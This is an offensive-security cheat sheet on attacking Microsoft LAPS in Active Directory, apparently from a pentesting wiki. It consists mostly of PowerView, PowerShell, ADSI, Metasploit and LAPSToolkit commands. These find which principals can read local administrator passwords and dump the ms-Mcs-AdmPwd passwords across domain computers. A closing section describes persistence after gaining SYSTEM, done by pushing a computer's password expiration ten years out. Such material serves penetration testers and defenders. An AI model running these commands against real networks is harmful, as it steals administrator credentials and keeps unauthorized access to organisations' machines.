# LAPS

## Description

The "Local Administrator Password Solution" (LAPS) provides management of local account passwords of domain joined computers. Passwords are stored in Active Directory (AD) and protected by ACL, so only eligible users can read it or request its reset.

## Enumeration

### Check if LAPS is installed Locally

```bash
# Identify if installed to Program Files
Get-ChildItem 'C:\Program Files\LAPS\CSE\Admpwd.dll'
Get-ChildItem 'C:\Program Files (x86)\LAPS\CSE\Admpwd.dll'
dir 'C:\Program Files\LAPS\CSE\'
dir 'C:\Program Files (x86)\LAPS\CSE\'

# Identify if installed by checking the AD Object
Get-ADObject 'CN=ms-mcs-admpwd,CN=Schema,CN=Configuration,DC=DC01,DC=Security,CN=Local'
```

### Enumerate GPO's that have "LAPS" in the name

{% code overflow="wrap" %}
```powershell
# PowerView
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

Get-DomainGPO | ? { $_.DisplayName -like "*password solution*" } | select DisplayName, Name, GPCFileSysPath | fl
```
{% endcode %}

### Enumerate Principals that can read the password on select systems

{% code overflow="wrap" %}
```powershell
# PowerView
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }
```
{% endcode %}

### ms-mcs-admpwd attribute

{% code overflow="wrap" %}
```powershell
# Powerview
# Find instances of ms-mcs-admpwd where it is not empty, Requires permission to view the ms-mcs-admpwd attribute.
Get-DomainComputer  | Select-Object 'dnshostname','ms-mcs-admpwd' | Where-Object {$_."ms-mcs-admpwd" -ne $null}

# Find instances where the expiration time is not empty, any user can read this so handy for checking if LAPS is installed on host
Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# PowerShell
Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null } | Select-Object 'Name','ms-Mcs-AdmPwd'

# Native
([adsisearcher]"(&(objectCategory=computer)(ms-MCS-AdmPwd=*)(sAMAccountName=*))").findAll() | ForEach-Object { Write-Host "" ; $_.properties.cn ; $_.properties.'ms-mcs-admpwd'}
```
{% endcode %}

### LAPS Configuration file

If LAPS is deployed by a GPO, we can identify the configuratio file to discover some details about the configuration.

{% code overflow="wrap" %}
```powershell
Get-Content "\\DC01.Security.local\SysVol\Security.local\Policies\{F2E893C1-725C-4AB9-AE13-39E7BB117C32}\Machine\Registry.pol"
```
{% endcode %}

After downloading the GPO registry.pol file use `Parse-PolFile` to read the file.

**GPRegistryPolicyParser:** [https://github.com/PowerShell/GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)

```powershell
Parse-PolFile "Registry.pol"
```

* Password complexity is upper, lower and numbers.
* Password length is 14.
* Passwords are changed every 30 days.
* The LAPS managed account name is LapsAdmin.
* Password expiration protection is disabled.

### LAPS Module commands

```powershell
# Import module
Import-Module AdmPwd.PS

# Find the OUs that can read LAPS passwords
Find-AdmPwdExtendedRights -Identity <OU>

# Once we have compromised a user that can read LAPS
Get-AdmPwdPassword -ComputerName <Hostname>
```

### Metasploit

```bash
use post/windows/gather/credentials/enum_laps
```

![](<../../.gitbook/assets/image (2027).png>)

## LAPSToolkit

**GitHub:** [https://github.com/leoloobeek/LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)

```powershell
# Get Groups that can read the ms-Mcs-AdmPwd attribute
Find-LAPSDelegatedGroups

# Gets all computers which have LAPS enabled
Get-LAPSComputers

# Checks for ExtendedRights for Laps on each AD Computer
Find-AdmPwdExtendedRights
```

<figure><img src="../../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

## LAPS Persistence

LAPS may be configured to automatically update a computers password on a regular basis. If we have compromised a computer and elevated to SYSTEM we can update the value to never expire for 10 years as a means of persistence.

```powershell
# PowerView
Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
Setting 'ms-Mcs-AdmPwdExpirationTime' to '136257686710000000' for object '[HostName$]'
```

## Resources

{% embed url="http://www.harmj0y.net/blog/powershell/running-laps-with-powerview/" %}

{% embed url="https://adsecurity.org/?p=3164" %}

{% embed url="https://github.com/leoloobeek/LAPSToolkit" %}
